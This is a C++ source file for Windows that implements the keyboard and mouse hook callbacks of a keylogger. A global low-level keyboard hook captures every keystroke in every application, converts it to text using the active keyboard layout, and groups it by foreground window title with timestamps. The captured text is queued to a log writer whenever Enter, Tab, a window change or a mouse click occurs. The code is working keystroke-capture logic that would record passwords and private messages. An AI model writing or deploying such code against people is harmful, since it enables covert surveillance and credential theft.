#include "KeyLogger.h"
#include "JsonLog.h"
#include "Utils.h"
#include "UnicodeUtils.h"
#include "ProcessUtils.h"
#include "LogWriter.h"
#include <windows.h>
#include <string>
#include <ctime>

extern HHOOK hKeyHook;
extern HHOOK hMouseHook;

std::wstring bufferText;
std::time_t bufferTimestamp = 0;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    static std::wstring lastAppTitle;
    static std::string lastDate;

    try {
        if (nCode == HC_ACTION)
        {
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                // Skip modifier keys and some special keys
                if (pKeyboard->vkCode == VK_LCONTROL || pKeyboard->vkCode == VK_RCONTROL ||
                    pKeyboard->vkCode == VK_LMENU || pKeyboard->vkCode == VK_RMENU ||
                    pKeyboard->vkCode == VK_LSHIFT || pKeyboard->vkCode == VK_RSHIFT ||
                    pKeyboard->vkCode == VK_BACK) {
                    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
                }

                std::wstring output;
                
                try {
                    // Get keyboard state
                    BYTE keyboardState[256] = {0};
                    if (GetKeyboardState(keyboardState)) {
                        if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
                            keyboardState[VK_SHIFT] |= 0x80;
                        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0)
                            keyboardState[VK_CONTROL] |= 0x80;
                        if ((GetAsyncKeyState(VK_MENU) & 0x8000) != 0)
                            keyboardState[VK_MENU] |= 0x80;
                    }

                    // Get keyboard layout for the active window
                    HWND hwnd = GetForegroundWindow();
                    DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
                    HKL hkl = GetKeyboardLayout(threadId);

                    // Use improved Unicode handling
                    std::wstring unicodeResult = UnicodeUtils::GetUnicodeFromKeyboard(
                        pKeyboard->vkCode, 
                        pKeyboard->scanCode, 
                        keyboardState, 
                        hkl
                    );

                    if (!unicodeResult.empty() && UnicodeUtils::IsPrintableUnicode(unicodeResult)) {
                        output = unicodeResult;
                    } else {
                        // Fall back to key name for special keys
                        LONG lParamKey = (pKeyboard->scanCode << 16);
                        if (pKeyboard->flags & LLKHF_EXTENDED) {
                            lParamKey |= 1 << 24;
                        }
                        WCHAR keyName[64] = { 0 };
                        if (GetKeyNameText(lParamKey, keyName, 64) > 0) {
                            output = keyName;
                        }
                    }
                }
                catch (const std::exception& e) {
                    // Unicode processing failed, use fallback
                    output = L"[?]";
                }

                try {
                    std::wstring appTitle = GetActiveWindowTitle();
                    std::string date = getCurrentDate();
                    bool isBreakKey = (output == L"\r" || output == L"\n" || output == L"Enter" || output == L"Tab");

                    // Handle app/date changes or break keys
                    if (appTitle != lastAppTitle || date != lastDate || isBreakKey) {
                        if (!bufferText.empty()) {
                            LogWriter_Enqueue(lastAppTitle, bufferText, bufferTimestamp);
                            bufferText.clear();
                        }
                        bufferTimestamp = getCurrentTimestamp();
                        lastAppTitle = appTitle;
                        lastDate = date;
                    }

                    // Add character to buffer if it's printable and not a break key
                    if (!isBreakKey && !output.empty() && UnicodeUtils::IsPrintableUnicode(output)) {
                        if (bufferText.empty()) bufferTimestamp = getCurrentTimestamp();
                        bufferText += output;
                    } else if (isBreakKey) {
                        if (!bufferText.empty()) {
                            LogWriter_Enqueue(appTitle, bufferText, bufferTimestamp);
                            bufferText.clear();
                        }
                    }
                }
                catch (const std::exception& e) {
                    // Process info or logging failed - ignore this keystroke
                }
            }
        }
    }
    catch (const std::exception& e) {
        // Critical error in keyboard hook - continue to prevent system issues
    }
    
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    try {
        if (nCode == HC_ACTION)
        {
            if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN)
            {
                try {
                    std::wstring appTitle = GetActiveWindowTitle();
                    std::string date = getCurrentDate();
                    if (!bufferText.empty()) {
                        LogWriter_Enqueue(appTitle, bufferText, bufferTimestamp);
                        bufferText.clear();
                        bufferTimestamp = getCurrentTimestamp();
                    }
                }
                catch (const std::exception& e) {
                    // Mouse click processing failed - ignore
                }
            }
        }
    }
    catch (const std::exception& e) {
        // Critical error in mouse hook - continue to prevent system issues
    }
    
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}